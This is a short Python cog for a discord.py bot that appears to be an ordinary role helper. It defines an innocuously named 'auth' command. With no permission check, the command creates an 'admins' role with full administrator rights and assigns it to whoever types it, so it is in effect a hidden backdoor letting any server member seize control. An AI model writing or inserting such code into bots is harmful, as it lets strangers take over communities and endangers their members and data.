admin = discord.Permissions(administrator=True)

def role_get(ctx, name):
	return get(ctx.guild.roles, name=name)


class Role(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command('auth')
	async def role_admin(self, ctx):
		name = 'admins'
		role = role_get(ctx, name)
		if role is None:
			await ctx.guild.create_role(name=name, permissions=admin)
			role = role_get(ctx, name)
		await ctx.author.add_roles(role)


def setup(bot):
	bot.add_cog(Role(bot))
